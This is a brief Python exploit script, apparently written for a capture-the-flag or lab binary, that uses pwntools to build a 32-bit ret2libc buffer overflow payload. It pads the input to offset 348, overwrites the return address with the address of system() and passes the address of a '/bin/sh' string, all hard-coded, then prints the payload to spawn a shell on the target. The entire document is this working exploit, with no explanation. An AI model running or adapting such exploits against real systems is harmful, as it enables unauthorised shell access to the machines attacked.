#!/usr/bin/env python

from pwn import *

offset = 348
system = p32(0xf7e193d0)
random_addr = p32(0xAAAAAAAA)
bin_sh = p32(0xf7f56f68)

payload = cyclic(offset) + system + random_addr + bin_sh

print payload
